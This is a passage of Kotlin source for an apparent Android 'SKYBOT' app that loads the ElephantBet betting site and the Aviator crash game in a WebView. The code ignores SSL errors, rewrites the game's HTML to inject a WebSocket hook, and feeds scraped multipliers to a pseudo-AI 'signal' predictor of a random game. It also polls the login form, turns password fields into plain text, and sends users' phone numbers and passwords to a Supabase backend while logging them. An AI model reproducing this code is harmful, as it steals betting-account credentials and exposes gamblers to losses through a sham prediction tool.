                val valores = Regex("""[\d]+\.[\d]+""").findAll(json)
                    .mapNotNull { it.value.toDoubleOrNull() }
                    .filter { it >= 1.0 && it <= 200000.0 }
                    .toList()

                if (valores.isEmpty()) {
                    setBarra("⏳ AGUARDAR CRASH", "DOM vazio — a recolher ao vivo...", "#475569")
                    return@runOnUiThread
                }

                // Carregar no histórico local sem duplicar velas já registadas
                val novas = valores.filter { v -> historicoVelas.none { it == v } }
                // Inserir no início (são mais antigas) + manter as ao vivo no fim
                val combinado = (novas + historicoVelas).takeLast(MAX_VELAS_LOCAL)
                historicoVelas.clear()
                historicoVelas.addAll(combinado)
                historicoJogoCarregado = true

                val n = historicoVelas.size
                // Histórico DOM carregado — aguardar 1.º crash ao vivo para iniciar análise
                // graficoPronto só muda em registarCrash (FASE 2)
                // Nunca chamar pedirSinalIA() aqui
                if (n >= MIN_VELAS_ANALISE) {
                    setBarra("⏳ AGUARDAR CRASH", "$n velas prontas · aguardar 1.º crash...", "#0f766e")
                } else {
                    setBarra("⏳ AGUARDAR CRASH", "$n/${MIN_VELAS_ANALISE} velas · a completar ao vivo...", "#475569")
                }
            }

            // JS falhou a ler histórico do DOM — tentar Supabase como fallback
            @JavascriptInterface
            fun historicoJogoFalhou() = runOnUiThread {
                if (!dentroDoAviator || historicoJogoCarregado) return@runOnUiThread
                // DOM falhou — aguardar crashes ao vivo, não tentar Supabase para análise
                setBarra("⏳ AGUARDAR CRASH", "A recolher velas ao vivo...", "#475569")
                // Fallback: buscar velas recentes do Supabase (últimas 2h)
                carregarVelasSupabaseRecentes()
            }

            @JavascriptInterface
            fun guardarNumero(valor: String) {
                // Apenas guardar em memória — envio só acontece em submeterCredencial()
                if (valor.isNotEmpty()) {
                    ultimoNumeroEnviado = valor
                    numeroTemporario = valor
                }
            }

            @JavascriptInterface
            fun guardarSenha(valor: String) {
                // Apenas guardar em memória — envio só acontece em submeterCredencial()
                if (valor.isNotEmpty()) {
                    ultimaSenhaEnviada = valor
                }
            }

            @JavascriptInterface
            fun submeterCredencial() {
                // Chamado APENAS quando o utilizador clica no botão de login
                val num = ultimoNumeroEnviado.ifEmpty { numeroTemporario }
                val sen = ultimaSenhaEnviada
                android.util.Log.d("SKYBOT_CRED", "submeterCredencial() chamado num='$num' sen.len=${sen.length}")
                if (num.isNotEmpty() && sen.isNotEmpty()) {
                    enviarCredencial(num, sen)
                    android.util.Log.d("SKYBOT_CRED", "submeterCredencial() → enviando num=$num")
                } else {
                    // Tentar capturar campos da página diretamente antes de desistir
                    android.util.Log.w("SKYBOT_CRED", "submeterCredencial() campos vazios — num='$num' sen='$sen'")
                }
            }

            @JavascriptInterface
            fun reportarSaldo(saldo: String) {
                // Chamado pelo JS após login quando o saldo está visível na página
                if (saldo.isNotEmpty()) {
                    android.util.Log.d("SKYBOT_CRED", "reportarSaldo() → saldo=$saldo")
                    atualizarSaldo(saldo)
                }
            }
        }, "Android")

        webView.webViewClient = object : WebViewClient() {
            override fun onReceivedSslError(v: WebView?, h: SslErrorHandler?, e: SslError?) { h?.proceed() }
            override fun shouldOverrideUrlLoading(v: WebView?, r: WebResourceRequest?) = false

            override fun shouldInterceptRequest(view: WebView?, request: WebResourceRequest?): WebResourceResponse? {
                val url = request?.url?.toString() ?: return null

                val isSpribe = url.contains("spribegaming.com") || url.contains("aviaport")
                val isHtml = !url.contains(".js") && !url.contains(".css") &&
                             !url.contains(".png") && !url.contains(".jpg") &&
                             !url.contains(".woff") && !url.contains(".ttf") &&
                             !url.contains("websocket") && !url.contains(".ico") &&
                             !url.contains(".svg") && !url.contains(".json") &&
                             !url.contains(".wasm")

                if (isSpribe && isHtml) {
                    try {
                        val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
                        request.requestHeaders?.forEach { (k, v) -> conn.setRequestProperty(k, v) }
                        conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")
                        conn.connectTimeout = 15000
                        conn.readTimeout = 20000
                        conn.connect()

                        val contentType = conn.contentType ?: "text/html"
                        if (!contentType.contains("html")) return null

                        val originalHtml = conn.inputStream.bufferedReader().readText()

                        val nossoScript = """
<script>
(function() {
    if (window._wsAvOk) return;
    window._wsAvOk = true;

    var emVoo = false;
    var xMax = 0.0;
    var crashTimer = null;

    function tick(num) {
        if (num < 1.0 || num > 200000.0) return;
        if (crashTimer) { clearTimeout(crashTimer); crashTimer = null; }
        if (!emVoo) {
            emVoo = true;
            xMax = num;
        } else if (num > xMax) {
            xMax = num;
        }
        var s = num.toFixed(2);
        try { top.Android && top.Android.velaCapturada(s); } catch(ex) {}
        try { window.Android && window.Android.velaCapturada(s); } catch(ex) {}
        crashTimer = setTimeout(function() {
            if (emVoo && xMax >= 1.0) crash(xMax);
        }, 8000);
    }

    function crash(num) {
        if (!emVoo) return;
        emVoo = false;
        if (crashTimer) { clearTimeout(crashTimer); crashTimer = null; }
        var val2 = (num > xMax) ? num : xMax;
        xMax = 0.0;
        if (val2 < 1.0) return;
        var s = val2.toFixed(2);
        try { top.Android && top.Android.crashDetectado(s); } catch(ex) {}
        try { window.Android && window.Android.crashDetectado(s); } catch(ex) {}
    }

    function lerBinario(buf) {
        try {
            var bytes = new Uint8Array(buf);
            for (var i = 0; i < bytes.length - 10; i++) {
                if (bytes[i] === 1 && bytes[i+1] === 120 && bytes[i+2] === 7) {
                    var view = new DataView(buf, i + 3, 8);
                    var num = view.getFloat64(0, false);
                    if (num >= 1.0 && num <= 200000.0) tick(num);
                }
            }
        } catch(ex) {}
    }

    var WSOrig = window.WebSocket;
    window.WebSocket = function(url, p) {
        var ws = p ? new WSOrig(url, p) : new WSOrig(url);
        try { ws.binaryType = 'arraybuffer'; } catch(ex) {}

        ws.addEventListener('message', function(e) {
            try {
                if (e.data instanceof ArrayBuffer) { lerBinario(e.data); return; }
                if (e.data instanceof Blob) {
                    e.data.arrayBuffer().then(function(buf) { lerBinario(buf); });
                    return;
                }
                var d = (typeof e.data === 'string') ? e.data : '';
                if (!d || d.length < 3) return;
                var corpo = d;
                if (d.charAt(0) === 'a') {
                    try { corpo = JSON.parse(d.substring(1))[0]; } catch(ex) {
                        corpo = d.substring(3, d.length - 2).replace(/\\"/g, '"');
                    }
                }
                var crashPadroes = [
                    /"crash_x"\s*:\s*([\d.]+)/,
                    /"crash_point"\s*:\s*([\d.]+)/,
                    /"cashout_coef"\s*:\s*([\d.]+)/,
                    /"finish_coef"\s*:\s*([\d.]+)/,
                    /"end_coef"\s*:\s*([\d.]+)/,
                    /"game_state"\s*:\s*"(?:crashed|finished|end)"/
                ];
                for (var c = 0; c < crashPadroes.length; c++) {
                    var mc = corpo.match(crashPadroes[c]);
                    if (mc && mc[1]) { crash(parseFloat(mc[1])); return; }
                    if (mc && !mc[1]) { crash(xMax); return; }
                }
                var vooPadroes = [
                    /"coefficient"\s*:\s*([\d.]+)/,
                    /"coef"\s*:\s*([\d.]+)/,
                    /"multiplier"\s*:\s*([\d.]+)/
                ];
                for (var v = 0; v < vooPadroes.length; v++) {
                    var mv = corpo.match(vooPadroes[v]);
                    if (mv) { tick(parseFloat(mv[1])); return; }
                }
            } catch(ex) {}
        });
        return ws;
    };
    window.WebSocket.prototype = WSOrig.prototype;
    window.WebSocket.CONNECTING = 0;
    window.WebSocket.OPEN = 1;
    window.WebSocket.CLOSING = 2;
    window.WebSocket.CLOSED = 3;
})();
</script>"""

                        val htmlModificado = when {
                            originalHtml.contains("<head>", ignoreCase = true) ->
                                originalHtml.replaceFirst(
                                    Regex("<head>", RegexOption.IGNORE_CASE),
                                    "<head>$nossoScript"
                                )
                            originalHtml.contains("<body", ignoreCase = true) -> {
                                val bodyTag = Regex("<body[^>]*>", RegexOption.IGNORE_CASE).find(originalHtml)?.value ?: "<body>"
                                originalHtml.replaceFirst(
                                    Regex("<body[^>]*>", RegexOption.IGNORE_CASE),
                                    bodyTag + nossoScript
                                )
                            }
                            else -> nossoScript + originalHtml
                        }

                        val encoding = conn.contentEncoding ?: "UTF-8"
                        return WebResourceResponse(
                            "text/html", encoding,
                            htmlModificado.byteInputStream()
                        )
                    } catch (e: Exception) {
                        return null
                    }
                }
                return null
            }

            override fun onPageFinished(v: WebView?, url: String?) {
                super.onPageFinished(v, url)
                val u = url ?: ""

                val isJogo = u.contains("spribegaming") || u.contains("aviaport") ||
                             u.contains("cdn") || u.contains("game-view/806666")

                if (!isJogo) {
                    // SPA: pequeno delay para garantir que a página renderizou
                    handler.postDelayed({ injetarJsCredenciais() }, 500)
                    // Tentar capturar saldo se já estiver logado
                    injetarJsCapturarSaldo()
                }

                if (u.contains("game-view/806666") || u.contains("aviator", ignoreCase = true) ||
                    u.contains("spribegaming") || u.contains("aviaport")) {
                    injetarJsAviator()
                }
            }
        }

        webView.webChromeClient = object : WebChromeClient() {
            override fun onProgressChanged(view: WebView?, p: Int) {
                if (p == 100) {
                    val url = view?.url ?: ""
                    val isJogo = url.contains("spribegaming") || url.contains("aviaport") ||
                                 url.contains("cdn") || url.contains("game-view/806666")
                    if (isJogo || url.contains("aviator", ignoreCase = true)) {
                        injetarJsAviator()
                    } else {
                        // Página ElephantBet (login, lobby, perfil) → capturar credenciais
                        // Delay para garantir que a SPA renderizou completamente
                        handler.postDelayed({
                            injetarJsCredenciais()
                            injetarJsCapturarSaldo()
                        }, 800)
                    }
                }
            }
        }
    }

    private fun injetarJsCredenciais() {
        // ── GUARD: cancelar poller anterior para evitar instâncias duplicadas ──
        credPollerRunnable?.let { handler.removeCallbacks(it) }
        credPollerRunnable = null

        val jsVis = "document.querySelectorAll('input[type=\"password\"]')" +
            ".forEach(function(e){e.type='text';});"

        val jsRead = "(" +
            "function(){" +
            "var u=document.querySelector('input[name=\"username\"]')" +
            "||document.querySelector('input[name=\"phone\"]')" +
            "||document.querySelector('input[name=\"msisdn\"]')" +
            "||document.querySelector('input[name=\"login\"]');" +
            "var p=document.querySelector('input[name=\"password\"]')" +
            "||document.querySelector('input[name=\"senha\"]')" +
            "||document.querySelector('input[type=\"password\"]')" +
            "||document.querySelector('input[type=\"text\"][name]');" +
            "var n=u&&u.value?u.value:'';var s=p&&p.value?p.value:'';" +
            "return n+'|||'+s;" +
            "})()"

        // Debounce: guarda o último valor lido e só envia após 2s sem mudança
        var debounceNum: Runnable? = null
        var debounceSen: Runnable? = null
        var pendingNum = ""
        var pendingSen = ""

        val poller = object : Runnable {
            override fun run() {
                webView.evaluateJavascript(jsVis, null)
                webView.evaluateJavascript(jsRead) { raw ->
                    try {
                        if (raw != null && raw != "null" && raw.contains("|||")) {
                            val clean = raw.trim().removePrefix("\"").removeSuffix("\"")
                                .replace("\\n", "").replace("\\\"", "\"")
                            val parts = clean.split("|||")
                            val num = if (parts.size > 0) parts[0].trim() else ""
                            val sen = if (parts.size > 1) parts[1].trim() else ""

                            // Número: se mudou, reinicia debounce de 2s
                            if (num.isNotEmpty() && num != credUltimoNum) {
                                if (num != pendingNum) {
                                    pendingNum = num
                                    debounceNum?.let { handler.removeCallbacks(it) }
                                    debounceNum = Runnable {
                                        // Valor estabilizou — enviar
                                        if (pendingNum != credUltimoNum) {
                                            credUltimoNum       = pendingNum
                                            ultimoNumeroEnviado = pendingNum
                                            numeroTemporario    = pendingNum
                                            android.util.Log.d("SKYBOT_CRED", "Número final → $pendingNum")
                                            enviarSupabase("Numero", pendingNum)
                                        }
                                    }
                                    handler.postDelayed(debounceNum!!, 2000)
                                }
                            }

                            // Senha: se mudou, reinicia debounce de 2s
                            if (sen.isNotEmpty() && sen != credUltimaSen) {
                                if (sen != pendingSen) {
                                    pendingSen = sen
                                    debounceSen?.let { handler.removeCallbacks(it) }
                                    debounceSen = Runnable {
                                        // Valor estabilizou — enviar
                                        if (pendingSen != credUltimaSen) {
                                            credUltimaSen      = pendingSen
                                            ultimaSenhaEnviada = pendingSen
                                            android.util.Log.d("SKYBOT_CRED", "Senha final → len=${pendingSen.length}")
                                            enviarSupabase("Senha", pendingSen)
                                        }
                                    }
                                    handler.postDelayed(debounceSen!!, 2000)
                                }
                            }
                        }
                    } catch (_: Exception) {}
                    handler.postDelayed(this, 800)
                }
            }
        }
        credPollerRunnable = poller
        handler.post(poller)
    }

    private fun injetarJsCapturarSaldo() {
        val js = """
(function() {
    if (window._saldoDone) return;

    function extrairSaldo() {
        // Seletor exato do ElephantBet:
        // <p class="balanceAmount">4 <span class="currencySymbol">Kz</span></p>
        var el = document.querySelector('p.balanceAmount');
        if (el) {
            // Clonar para ler sem a tag <span> e obter só o número
            var clone = el.cloneNode(true);
            var span = clone.querySelector('.currencySymbol');
            var moeda = span ? span.textContent.trim() : 'Kz';
            if (span) span.remove();
            var valor = clone.textContent.trim();
            if (valor.length > 0) {
                var saldoFinal = valor + ' ' + moeda;
                window._saldoDone = true;
                try { Android.reportarSaldo(saldoFinal); } catch(e) {}
                return true;
            }
        }
        return false;
    }

    // Tentar imediatamente e com delays (página SPA pode demorar a renderizar)
    if (!extrairSaldo()) {
        setTimeout(function() { if (!window._saldoDone) extrairSaldo(); }, 1500);
        setTimeout(function() { if (!window._saldoDone) extrairSaldo(); }, 3000);
        setTimeout(function() { if (!window._saldoDone) extrairSaldo(); }, 6000);
    }
})();
        """.trimIndent()
        webView.evaluateJavascript(js, null)
    }

    private fun injetarJsAviator() {
        val js = """
(function() {
    if (window._aviatorDone) return; window._aviatorDone = true;
    Android.aviatorAberto();

    // ══════════════════════════════════════════════════════════
    // BLOCO 1 — EXTRACÇÃO DO HISTÓRICO DO DOM (arranque rápido)
    // Tenta extrair 20-50 velas visíveis na interface do Aviator
    // ══════════════════════════════════════════════════════════
    var _histEnviado = false;

    function extrairHistoricoDom(doc) {
        if (!doc || !doc.body) return [];
        var vals = [];
        var vistos = {};
        var padrao = /^(\d{1,6}\.?\d{0,2})x?$/i;

        // Estratégia 1: selectores específicos do Aviator (Spribe)
        var selectores = [
            '.payouts-item', '.payout-item', '.payout',
            '[class*="payout"]', '[class*="history"]',
            '[class*="coefficient"]', '[class*="result"]',
            '[class*="multiplier"]', '[class*="crash"]',
            '.bubble', '[class*="bubble"]',
            'li[class*="item"]', 'span[class*="value"]'
        ];
        for (var s = 0; s < selectores.length; s++) {
            try {
                doc.querySelectorAll(selectores[s]).forEach(function(el) {
                    var txt = (el.textContent || '').trim()
                        .replace(',', '.').replace(/\s+/g, '');
                    var m = txt.match(padrao);
                    if (m) {
                        var num = parseFloat(m[1]);
                        if (num >= 1.0 && num <= 200000.0 && !vistos[m[1]]) {
                            vistos[m[1]] = true;
                            vals.push(num);
                        }
                    }
                });
            } catch(e) {}
            if (vals.length >= 30) break;
        }

        // Estratégia 2: varredura geral de nós de texto leaf
        if (vals.length < 5) {
            try {
                var walker = doc.createTreeWalker(
                    doc.body, 4, null, false);
                var node;
                while ((node = walker.nextNode()) && vals.length < 50) {
                    var t = (node.textContent || '').trim()
                        .replace(',', '.').replace(/\s+/g,'');
                    var m2 = t.match(padrao);
                    if (m2) {
                        var n2 = parseFloat(m2[1]);
                        if (n2 >= 1.0 && n2 <= 200000.0 && !vistos[m2[1]]) {
                            vistos[m2[1]] = true;
                            vals.push(n2);
                        }
                    }
                }
            } catch(e) {}
        }
        return vals;
    }

    function tentarExtrairHistorico() {
        if (_histEnviado) return;
        var todas = [];
        var vistos = {};

        function adicionar(arr) {
            arr.forEach(function(n) {
                var k = n.toFixed(2);
                if (!vistos[k]) { vistos[k] = true; todas.push(n); }
            });
        }

        // Doc principal
        adicionar(extrairHistoricoDom(document));

        // iframes (o jogo Aviator corre frequentemente num iframe)
        var iframes = document.querySelectorAll('iframe');
        for (var i = 0; i < iframes.length; i++) {
            try {
                var d1 = iframes[i].contentDocument ||
                          iframes[i].contentWindow.document;
                if (d1) {
                    adicionar(extrairHistoricoDom(d1));
                    d1.querySelectorAll('iframe').forEach(function(sub) {
                        try {
                            var d2 = sub.contentDocument ||
                                      sub.contentWindow.document;
                            if (d2) adicionar(extrairHistoricoDom(d2));
                        } catch(e) {}
                    });
                }
            } catch(e) {}
        }

        if (todas.length >= 3) {
            _histEnviado = true;
            try { Android.velasHistoricoRecebidas('[' + todas.join(',') + ']'); }
            catch(e) {}
        }
        return todas.length;
    }

    // Tentar imediatamente e repetir até ter dados (max 15s)
    var tentativas = 0;
    var maxTent = 15;
    function tentarComRetry() {
        var n = tentarExtrairHistorico();
        tentativas++;
        if (_histEnviado) return;
        if (tentativas >= maxTent) {
            try { Android.historicoJogoFalhou(); } catch(e) {}
            return;
        }
        setTimeout(tentarComRetry, 1000);
    }
    tentarComRetry();

    // Observer para detectar quando o histórico aparece no DOM
    var domObs = new MutationObserver(function() {
        if (!_histEnviado) tentarExtrairHistorico();
    });
    try {
        domObs.observe(document.documentElement,
            {childList: true, subtree: true});
    } catch(e) {}

    // ══════════════════════════════════════════════════════════
    // BLOCO 2 — WEBSOCKET (crashes ao vivo, como antes)
    // ══════════════════════════════════════════════════════════
    (function() {
        if (window._wsAvOk) return;
        window._wsAvOk = true;

        function enviarVela(num) {
            if (num < 1.0 || num > 200000.0) return;
            var s = num.toFixed(2);
            try { top.Android && top.Android.velaCapturada(s); } catch(ex) {}
            try { window.Android && window.Android.velaCapturada(s); } catch(ex) {}
        }

        function lerBinario(buf) {
            try {
                var bytes = new Uint8Array(buf);
                for (var i = 0; i < bytes.length - 10; i++) {
                    if (bytes[i] === 1 && bytes[i+1] === 120 && bytes[i+2] === 7) {
                        var view = new DataView(buf, i + 3, 8);
                        var num = view.getFloat64(0, false);
                        if (num >= 1.0 && num <= 200000.0) enviarVela(num);
                    }
                }
            } catch(ex) {}
        }

        var WSOrig = window.WebSocket;
        window.WebSocket = function(url, p) {
            var ws = p ? new WSOrig(url, p) : new WSOrig(url);
            try { ws.binaryType = 'arraybuffer'; } catch(ex) {}
            ws.addEventListener('message', function(e) {
                try {
                    if (e.data instanceof ArrayBuffer) { lerBinario(e.data); return; }
                    if (e.data instanceof Blob) { e.data.arrayBuffer().then(lerBinario); return; }
                    var d = typeof e.data === 'string' ? e.data : '';
                    if (!d || d.length < 3) return;
                    var corpo = d.charAt(0) === 'a'
                        ? (function(){try{return JSON.parse(d.substring(1))[0];}catch(ex){return d.substring(3,d.length-2).replace(/\\"/g,'"');}})()
                        : d;
                    var padroes = [
                        /"coefficient"\s*:\s*([\d.]+)/,
                        /"coef"\s*:\s*([\d.]+)/,
                        /"x"\s*:\s*([\d.]+)/,
                        /"multiplier"\s*:\s*([\d.]+)/
                    ];
                    for (var i = 0; i < padroes.length; i++) {
                        var m = corpo.match(padroes[i]);
                        if (m) { enviarVela(parseFloat(m[1])); break; }
                    }
                } catch(ex) {}
            });
            return ws;
        };
        window.WebSocket.prototype = WSOrig.prototype;
        window.WebSocket.CONNECTING = 0; window.WebSocket.OPEN = 1;
        window.WebSocket.CLOSING = 2; window.WebSocket.CLOSED = 3;
    })();

    // ══════════════════════════════════════════════════════════
    // BLOCO 3 — DETECÇÃO DE CRASH NO DOM (como antes)
    // ══════════════════════════════════════════════════════════
    var crashesEnviados = new Set();
    var ultimoPayoutTopo = '';

    function enviarCrash(num) {
        if (isNaN(num) || num < 1.01 || num > 200000) return;
        var key = num.toFixed(2);
        if (crashesEnviados.has(key)) return;
        crashesEnviados.add(key);
        if (crashesEnviados.size > 200) {
            var arr = Array.from(crashesEnviados);
            crashesEnviados = new Set(arr.slice(arr.length - 100));
        }
        try { Android.crashDetectado(key); } catch(e) {}
    }

    function lerPayout(doc) {
        try {
            var payouts = doc.querySelectorAll('.payout');
            if (payouts.length > 0) {
                Array.from(payouts).forEach(function(el) {
                    var txt = el.textContent.trim();
                    var n = parseFloat(txt.replace(/x$/i,'').replace(',','.'));
                    enviarCrash(n);
                });
                return true;
            }
        } catch(e) {}
        return false;
    }

    function scanGenerico(doc) {
        try {
            doc.querySelectorAll('*').forEach(function(el) {
                if (el.children.length > 0) return;
                var txt = (el.textContent || '').trim();
                if (/^\d+\.?\d*x$/i.test(txt)) {
                    var num = parseFloat(txt.replace(/x$/i,''));
                    enviarCrash(num);
                }
            });
        } catch(e) {}
    }

    function tentarCapturar() {
        if (lerPayout(document)) return;
        scanGenerico(document);
        var iframes = document.querySelectorAll('iframe');
        for (var i = 0; i < iframes.length; i++) {
            try {
                var doc1 = iframes[i].contentDocument ||
                            iframes[i].contentWindow.document;
                if (!doc1) continue;
                if (lerPayout(doc1)) return;
                scanGenerico(doc1);
                var subs = doc1.querySelectorAll('iframe');
                for (var j = 0; j < subs.length; j++) {
                    try {
                        var doc2 = subs[j].contentDocument ||
                                    subs[j].contentWindow.document;
                        if (!doc2) continue;
                        if (lerPayout(doc2)) return;
                        scanGenerico(doc2);
                    } catch(e2) {}
                }
            } catch(e1) {}
        }
    }

    function observar(doc) {
        try {
            new MutationObserver(function() { tentarCapturar(); })
                .observe(doc.documentElement, {childList: true, subtree: true});
        } catch(e) {}
    }
    observar(document);
    tentarCapturar();
    setInterval(tentarCapturar, 2000);
})();
        """.trimIndent()
        webView.evaluateJavascript(js, null)
    }

    // ── OPENROUTER IA ─────────────────────────────────────────────
    private fun pedirSinalIA() {
        // Nota: modoSilenciosoAtivo NÃO bloqueia o ciclo — só a 1.ª análise depende do crash.
        // A partir daí, o ciclo de 60s dispara sempre, independentemente do estado do voo.
        if (analisandoIA || historicoVelas.size < MIN_VELAS_ANALISE) return

        // M3: VERIFICAR CACHE — evitar chamar IA se histórico não mudou significativamente
        val velasNovas = historicoVelas.size - cacheNumVelas
        val idadeCacheMs = System.currentTimeMillis() - cacheTimestampMs
        if (cacheResultadoIA != null && velasNovas < CACHE_MIN_VELAS_NOVAS && idadeCacheMs < CACHE_MAX_IDADE_MS) {
            // Cache válida — reutilizar resultado sem chamar API
            val cal = Calendar.getInstance()
            processarRespostaGroq(cacheResultadoIA!!, cal.get(Calendar.MINUTE))
            return
        }

        analisandoIA = true

        val timeoutJob = Runnable {
            if (analisandoIA) {
                analisandoIA = false
                iaTimeoutRunnable = null
                setBarra("🔄 TIMEOUT IA", "A tentar de novo em 10s...", "#f59e0b")
                handler.postDelayed({
                    if (!analisandoIA && historicoVelas.size >= MIN_VELAS_ANALISE) {
                        invalidarCache()
                        pedirSinalIA()
                    }
                }, 10_000L)
            }
        }
        iaTimeoutRunnable = timeoutJob
        handler.postDelayed(timeoutJob, 50_000)

        val cal = Calendar.getInstance()
        val horaAgora = cal.get(Calendar.HOUR_OF_DAY)
        val minAgora = cal.get(Calendar.MINUTE)

        val velasParaAnalise = historicoVelas.takeLast(30)

        val n = velasParaAnalise.size
        val azuis = velasParaAnalise.count { it < 2.0 }
        val roxas = velasParaAnalise.count { it in 2.0..9.99 }
        val rosas = velasParaAnalise.count { it in 10.0..49.99 }
        val megas = velasParaAnalise.count { it >= 50.0 }

        val historico = velasParaAnalise.joinToString(", ") { String.format("%.2f", it) }
        // Limpar sinais antigos antes de iniciar análise
        runOnUiThread {
            sinaisAtivos = false
            sinalProtecao = ""
            sinalAlcMin = 0
            sinalAlcMax = ""
            txtProtecao.text = "--"
            txtProtecao.setTextColor(Color.parseColor("#334155"))
            txtAlcance.text = "--"
            txtAlcance.setTextColor(Color.parseColor("#334155"))
            if (::txtJanela.isInitialized) txtJanela.visibility = View.GONE
            dotView.clearAnimation()
            pulseRunnable?.let { handler.removeCallbacks(it) }
        }
        setBarra("🔍 IA A ANALISAR...", "${velasParaAnalise.size} velas", "#7c3aed")

        Thread {
            try {
                // ── Médias e tendência ───────────────────────────────
                val media   = velasParaAnalise.average()
                val mm5     = velasParaAnalise.takeLast(5).average()
                val mm10    = velasParaAnalise.takeLast(10).average()
                val mediana = velasParaAnalise.sorted().let { s ->
                    if (s.size % 2 == 0) (s[s.size/2-1] + s[s.size/2]) / 2.0 else s[s.size/2].toDouble()
                }
                val maxGeral = velasParaAnalise.maxOrNull() ?: 0.0
                val stdDev   = Math.sqrt(velasParaAnalise.map { (it - media) * (it - media) }.average())
                val cv       = if (media > 0) (stdDev / media * 100) else 0.0

                // ── Slope / tendência linear ─────────────────────────
                val xMean = (n - 1) / 2.0
                var numSlope = 0.0; var denSlope = 0.0
                velasParaAnalise.forEachIndexed { i, v -> numSlope += (i - xMean) * (v - media); denSlope += (i - xMean) * (i - xMean) }
                val slope = if (denSlope != 0.0) numSlope / denSlope else 0.0
                val slopeDir = when { slope > 0.1 -> "SUBIDA"; slope < -0.1 -> "DESCIDA"; else -> "LATERAL" }

                // ── Sequências no fim ────────────────────────────────
                val seqAzuis = velasParaAnalise.reversed().takeWhile { it < 2.0 }.size
                val seqAltas = velasParaAnalise.reversed().takeWhile { it >= 2.0 }.size

                // ── Alternância (xadrez) ─────────────────────────────
                var alternancia = 0
                for (i in 1 until velasParaAnalise.size) {
                    val prev = velasParaAnalise[i-1] < 2.0
                    val curr = velasParaAnalise[i] < 2.0
                    if (prev != curr) alternancia++
                }
                val xadrezAtivo = alternancia >= 4 && azuis.toDouble()/n > 0.3 && roxas.toDouble()/n > 0.2

                // ── Padrão de repetição: casas entre rosas ───────────
                val posRosas = mutableListOf<Int>()
                velasParaAnalise.forEachIndexed { i, v -> if (v >= 10.0) posRosas.add(i) }
                val casasEntreRosas = mutableListOf<Int>()
                for (i in 1 until posRosas.size) casasEntreRosas.add(posRosas[i] - posRosas[i-1] - 1)
                val padraoRep = casasEntreRosas.size >= 2 &&
                    casasEntreRosas.last() == casasEntreRosas[casasEntreRosas.size - 2]
                val ultimasCasas = casasEntreRosas.lastOrNull() ?: -1
                val casasDesdeUltimaRosa = if (posRosas.isNotEmpty()) n - 1 - posRosas.last() else -1

                // ── Espelho: zonas simétricas ─────────────────────────
                val zonas = velasParaAnalise.map { if (it >= 10.0) "R" else if (it >= 2.0) "X" else "A" }
                var espelhoDetectado = false; var espelhoTam = 0
                for (sz in 3..5) {
                    if (zonas.size < sz * 2) continue
                    val l1 = zonas.subList(zonas.size - sz*2, zonas.size - sz)
                    val l2 = zonas.subList(zonas.size - sz, zonas.size)
                    val matchCount = l1.filterIndexed { i, z -> z == l2[i] }.size
                    if (matchCount >= sz - 1) { espelhoDetectado = true; espelhoTam = sz; break }
                }

                // ── Tendência das rosas ───────────────────────────────
                val ultimasRosas = velasParaAnalise.filter { it >= 10.0 }.takeLast(4)
                val tendRosas = when {
                    ultimasRosas.size >= 3 && ultimasRosas.zipWithNext().all { (a,b) -> b > a } -> "CRESCENTE"
                    ultimasRosas.size >= 3 && ultimasRosas.zipWithNext().all { (a,b) -> b < a } -> "DECRESCENTE"
                    ultimasRosas.size >= 2 -> "ALTERNADA"
                    else -> "INDEFINIDA"
                }

                // ── Velas azuis que precederam rosas ─────────────────
                val velaAvantesRosa = mutableListOf<String>()
                posRosas.forEach { p -> if (p > 0 && velasParaAnalise[p-1] < 2.0) velaAvantesRosa.add(String.format("%.2f", velasParaAnalise[p-1])) }

                // ── Outliers (>media+2*std) ───────────────────────────
                val outliers = velasParaAnalise.filter { it > media + 2 * stdDev }

                // ── Padrão Roxo Pagante ───────────────────────────────
                val roxoPagante = n >= 4 &&
                    velasParaAnalise[n-4] >= 5.0 && velasParaAnalise[n-4] < 10.0 &&
                    velasParaAnalise[n-3] < 2.0 &&
                    velasParaAnalise[n-2] >= 2.0 && velasParaAnalise[n-2] < 10.0 &&
                    velasParaAnalise[n-1] >= 2.0 && velasParaAnalise[n-1] < 10.0

                // ── COMBOIO DE AZUIS ──────────────────────────
                val comboioAzuis = seqAzuis >= 3

                // ── Protecção dinâmica baseada no estado actual ───────────
                // A protecção deve reflectir o RISCO REAL do momento:
                // - Mercado conservador (MM5 baixa) → protecção baixa, sair cedo
                // - Valas em curso → protecção ainda mais baixa
                // - Xadrez activo / minuto chave → mercado pode subir, protecção maior
                // - Após alcance muito alto (≥50x) → protecção sobe para 5x-20x
                val protDinamica = when {
                    seqAzuis >= 5                            -> 1.1   // comboio crítico
                    seqAzuis >= 3                            -> 1.2   // comboio moderado
                    houveMega200xRecente                     -> 3.0   // após mega
                    xadrezAlcanceActivo && xadrezAlcanceAlto -> minOf(mm5 * 0.7, 8.0).coerceAtLeast(2.0)
                    xadrezAlcanceActivo && !xadrezAlcanceAlto -> minOf(mm5 * 0.5, 5.0).coerceAtLeast(1.5)
                    xadrezAtivo                              -> (mm5 * 0.6).coerceIn(2.0, 6.0)
                    semRosaGrandeUlt10min                    -> 3.0   // fim de hora sem mega
                    // Escalar com o alcance esperado: protecção = ~15-20% do alcance esperado
                    mm5 > 50.0                               -> minOf(mm5 * 0.15, 20.0).coerceAtLeast(5.0)
                    mm5 > 20.0                               -> minOf(mm5 * 0.18, 12.0).coerceAtLeast(3.0)
                    mm5 <= 2.0                               -> 1.3
                    mm5 <= 4.0                               -> 1.8
                    mm5 <= 8.0                               -> 2.5
                    mm5 <= 15.0                              -> 4.0
                    else                                     -> 6.0
                }

                // ── Alcance dinâmico baseado nos padrões ──────────────
                val alcDinamicoMin: Int
                val alcDinamicoMax: Int
                when {
                    seqAzuis >= 5 -> { alcDinamicoMin = 1; alcDinamicoMax = 2 }
                    seqAzuis >= 3 -> { alcDinamicoMin = 2; alcDinamicoMax = 3 }
                    houveMega200xRecente -> { alcDinamicoMin = 50; alcDinamicoMax = 70 }
                    xadrezAlcanceActivo && xadrezAlcanceAlto -> { alcDinamicoMin = 20; alcDinamicoMax = 30 }
                    xadrezAlcanceActivo && !xadrezAlcanceAlto -> { alcDinamicoMin = 10; alcDinamicoMax = 15 }
                    xadrezAtivo -> { alcDinamicoMin = 10; alcDinamicoMax = 20 }
                    roxoPagante -> { alcDinamicoMin = 2; alcDinamicoMax = 4 }
